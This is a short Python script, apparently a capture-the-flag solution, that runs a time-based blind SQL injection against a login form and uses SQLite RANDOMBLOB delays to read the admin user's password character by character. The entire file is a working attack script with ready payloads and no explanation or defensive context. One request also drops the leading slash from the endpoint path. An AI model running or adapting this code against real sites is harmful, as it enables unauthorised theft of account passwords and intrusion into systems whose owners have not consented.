import requests as r;
import time;
target = input("Input target url below!\n")
payload= {
    "user":"admin",
    "pass":"' UNION SELECT CASE WHEN(SUBSTR ((SELECT password FROM users WHERE username is 'admin'),1,1) is '1') THEN (82=LIKE('TROLLED',UPPER(HEX(RANDOMBLOB(2000000000/2))))) ELSE 1/0='a' END,'"
}
counter = 1
password = ""
low = 0
high = 128
while(counter<50):
    value = (int)((low+high)/2);
    time.sleep(.5)
    payload["pass"]="' UNION SELECT CASE WHEN(SUBSTR ((SELECT password FROM users WHERE username is 'admin'),{index},1) > CHAR({value})) THEN (82=LIKE('TROLLED',UPPER(HEX(RANDOMBLOB(2000000000/2))))) ELSE 1 END,'".format(index=counter,value=value)
    r1 = r.post(target+"/fff5bf676ba8796f0c51033403b35311/login",data=payload)
    if(r1.elapsed.total_seconds()>2):
        low = value
        value = (int)((low+high)/2)
    time.sleep(.5)
    payload["pass"]="' UNION SELECT CASE WHEN(SUBSTR ((SELECT password FROM users WHERE username is 'admin'),{index},1) < CHAR({value})) THEN (82=LIKE('TROLLED',UPPER(HEX(RANDOMBLOB(2000000000/2))))) ELSE 1 END,'".format(index=counter,value=value)
    r1 = r.post(target+"fff5bf676ba8796f0c51033403b35311/login",data=payload)
    if(r1.elapsed.total_seconds()>2):
        high = value
        value = (int)((low+high)/2)
    payload["pass"]="' UNION SELECT CASE WHEN(SUBSTR ((SELECT password FROM users WHERE username is 'admin'),{index},1) is CHAR({value})) THEN (82=LIKE('TROLLED',UPPER(HEX(RANDOMBLOB(2000000000/2))))) ELSE 1 END,'".format(index=counter,value=value)
    time.sleep(.5)
    r1 = r.post(target + "/fff5bf676ba8796f0c51033403b35311/login",data=payload)
    if(r1.elapsed.total_seconds()>2):  
        low = 0
        high = 128
        password = password + (chr)(value)
        counter = counter+1
        print(password)
    print(r1)
print(password)